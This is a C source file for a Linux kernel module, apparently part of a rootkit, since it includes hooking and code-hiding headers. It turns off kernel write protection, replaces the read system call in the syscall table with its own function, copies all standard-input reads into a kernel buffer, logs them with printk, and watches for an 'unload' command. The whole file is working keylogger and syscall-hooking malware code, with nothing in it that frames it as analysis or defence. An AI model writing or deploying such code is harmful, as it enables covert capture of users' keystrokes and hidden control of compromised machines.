#include<linux/kernel.h>
#include<linux/syscalls.h>
#include<linux/unistd.h>
#include<linux/slab.h>
#include<linux/string.h>

#include "hooking.h"
#include "code_hiding.h"

ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);

static char * buffer;

ssize_t my_read(int fd, void * buf, size_t count){
	static int buf_size = 0;
	ssize_t retVal;
	retVal = orig_sys_read(fd, buf, count);
	if(fd == 0){ //stdin
		if(count >= buf_size){
			kfree(buffer);
			buffer = (char *) kmalloc(count+1, GFP_KERNEL);
		}
		if(buffer != NULL){
			strncpy(buffer, (char*)buf, count);
			buffer[count]='\0';
			printk(KERN_INFO "%s\n", buffer);
			if(strncmp(buffer, "unload", 6) == 0){
				printk(KERN_INFO "received unload signal\n");
			}		
		}
	}
	return retVal;
}	

void listen(void){
	disable_wp();
	orig_sys_read = syscall_table[__NR_read];
	syscall_table[__NR_read] = my_read;
	enable_wp();
}

void stop_listen(void){
	disable_wp();
	syscall_table[__NR_read] = orig_sys_read;
	enable_wp();
}

